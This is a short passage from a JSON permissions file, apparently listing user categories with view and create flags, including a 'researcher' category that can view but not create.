      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}